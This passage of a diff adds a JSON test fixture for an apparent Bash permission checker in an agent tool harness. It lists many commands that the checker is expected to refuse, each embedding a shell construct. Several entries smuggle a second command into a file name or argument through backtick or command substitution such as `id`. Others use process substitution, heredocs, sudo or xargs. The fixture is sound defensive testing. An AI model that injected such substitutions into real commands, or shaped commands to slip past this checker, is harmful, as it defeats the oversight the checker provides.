+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "Bash",
+  "command": "gh pr `id` 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "Bash",
+  "command": "env `id` ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "Bash",
+  "command": "ls && `id`",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick",
+  "tool": "Bash",
+  "command": "tee `id` < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "echo x > $'a'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "cp a.ts $'a'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "git $'a' feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "gh pr $'a' 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "env $'a' ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "ls && $'a'",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$",
+  "tool": "Bash",
+  "command": "tee $'a' < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "echo x > a(b)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "cp a.ts a(b)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "git a(b) feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "gh pr a(b) 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "env a(b) ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "ls && a(b)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "tee a(b) < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "echo x > (ls)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "cp a.ts (ls)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "git (ls) feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "gh pr (ls) 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "env (ls) ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "ls && (ls)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "parenthesis",
+  "tool": "Bash",
+  "command": "tee (ls) < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "parenthesis"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "echo x > a{b,c}",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "cp a.ts a{b,c}",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "git a{b,c} feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "gh pr a{b,c} 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "env a{b,c} ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "ls && a{b,c}",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "tee a{b,c} < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "echo x > *.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "cp a.ts *.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "git *.ts feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "gh pr *.ts 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "env *.ts ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "ls && *.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "tee *.ts < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "echo x > a?b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "cp a.ts a?b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "git a?b feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "gh pr a?b 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "env a?b ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "ls && a?b",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "tee a?b < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "echo x > a[1]",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "cp a.ts a[1]",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "git a[1] feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "gh pr a[1] 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "env a[1] ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "ls && a[1]",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "glob",
+  "tool": "Bash",
+  "command": "tee a[1] < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "glob"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "Bash",
+  "command": "echo x > ~/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "Bash",
+  "command": "cp a.ts ~/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "Bash",
+  "command": "git ~/x feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "Bash",
+  "command": "gh pr ~/x 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "Bash",
+  "command": "env ~/x ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "Bash",
+  "command": "ls && ~/x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "tilde",
+  "tool": "Bash",
+  "command": "tee ~/x < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "tilde"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside double quotes",
+  "tool": "Bash",
+  "command": "echo x > \"$x\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside double quotes",
+  "tool": "Bash",
+  "command": "cp a.ts \"$x\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside double quotes",
+  "tool": "Bash",
+  "command": "git \"$x\" feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside double quotes",
+  "tool": "Bash",
+  "command": "gh pr \"$x\" 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside double quotes",
+  "tool": "Bash",
+  "command": "env \"$x\" ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside double quotes",
+  "tool": "Bash",
+  "command": "ls && \"$x\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "$ inside double quotes",
+  "tool": "Bash",
+  "command": "tee \"$x\" < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "$ inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside double quotes",
+  "tool": "Bash",
+  "command": "echo x > \"`id`\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside double quotes",
+  "tool": "Bash",
+  "command": "cp a.ts \"`id`\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside double quotes",
+  "tool": "Bash",
+  "command": "git \"`id`\" feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside double quotes",
+  "tool": "Bash",
+  "command": "gh pr \"`id`\" 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside double quotes",
+  "tool": "Bash",
+  "command": "env \"`id`\" ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside double quotes",
+  "tool": "Bash",
+  "command": "ls && \"`id`\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backtick inside double quotes",
+  "tool": "Bash",
+  "command": "tee \"`id`\" < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backtick inside double quotes"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "echo x > \"a\\b\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "cp a.ts \"a\\b\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "git \"a\\b\" feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "gh pr \"a\\b\" 2",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "env \"a\\b\" ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "ls && \"a\\b\"",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "backslash",
+  "tool": "Bash",
+  "command": "tee \"a\\b\" < a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "backslash"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "if feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env if ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "if a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "then feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env then ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "then a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "for feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env for ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "for a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "while feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env while ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "while a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "do feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env do ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "do a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "done feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env done ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "done a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "case feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env case ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "case a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "esac feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env esac ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "esac a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "! feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env ! ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "! a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "time feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env time ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "time a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "function feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env function ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "function a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "until feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env until ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "until a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "select feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env select ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "select a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "coproc feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "env coproc ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "reserved word",
+  "tool": "Bash",
+  "command": "coproc a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "reserved word"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "{ feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "env { ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "brace",
+  "tool": "Bash",
+  "command": "{ a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "brace"
+ },
+ {
+  "source": "gen-p0",
+  "id": "comment",
+  "tool": "Bash",
+  "command": "#cmt feature",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "comment"
+ },
+ {
+  "source": "gen-p0",
+  "id": "comment",
+  "tool": "Bash",
+  "command": "env #cmt ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "comment"
+ },
+ {
+  "source": "gen-p0",
+  "id": "comment",
+  "tool": "Bash",
+  "command": "#cmt a.ts",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "comment"
+ },
+ {
+  "source": "gen-p0",
+  "id": "newline",
+  "tool": "Bash",
+  "command": "ls\nwc",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "newline"
+ },
+ {
+  "source": "gen-p0",
+  "id": "background",
+  "tool": "Bash",
+  "command": "ls &",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "background"
+ },
+ {
+  "source": "gen-p0",
+  "id": "|& pipe",
+  "tool": "Bash",
+  "command": "ls |& wc",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "|& pipe"
+ },
+ {
+  "source": "gen-p0",
+  "id": ">| redirect",
+  "tool": "Bash",
+  "command": "ls >| f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": ">| redirect"
+ },
+ {
+  "source": "gen-p0",
+  "id": "process substitution",
+  "tool": "Bash",
+  "command": "ls >(cat)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "process substitution"
+ },
+ {
+  "source": "gen-p0",
+  "id": ">& redirect",
+  "tool": "Bash",
+  "command": "ls >& f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": ">& redirect"
+ },
+ {
+  "source": "gen-p0",
+  "id": "&>> redirect",
+  "tool": "Bash",
+  "command": "ls &>> f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "&>> redirect"
+ },
+ {
+  "source": "gen-p0",
+  "id": "process substitution or fd redirect",
+  "tool": "Bash",
+  "command": "cat <(ls)",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "process substitution or fd redirect"
+ },
+ {
+  "source": "gen-p0",
+  "id": "file-descriptor redirect",
+  "tool": "Bash",
+  "command": "ls 3> f",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "file-descriptor redirect"
+ },
+ {
+  "source": "gen-p0",
+  "id": ";; (case terminator)",
+  "tool": "Bash",
+  "command": "ls ;; ",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": ";; (case terminator)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "heredoc or here-string",
+  "tool": "Bash",
+  "command": "cat <<EOF",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "heredoc or here-string"
+ },
+ {
+  "source": "gen-p0",
+  "id": "heredoc or here-string",
+  "tool": "Bash",
+  "command": "cat <<<x",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "heredoc or here-string"
+ },
+ {
+  "source": "gen-p0",
+  "id": "wrapper, shell or code-running command (timeout)",
+  "tool": "Bash",
+  "command": "timeout 5 ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "wrapper, shell or code-running command (timeout)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(sudo)",
+  "tool": "Bash",
+  "command": "sudo ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(sudo)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(nice)",
+  "tool": "Bash",
+  "command": "nice ls",
+  "cwd": "",
+  "expect": null,
+  "kind": "refused",
+  "construct": "(nice)"
+ },
+ {
+  "source": "gen-p0",
+  "id": "(xargs)",
+  "tool": "Bash",
+  "command": "xargs wc",
+  "cwd": "",
+  "expect": null,
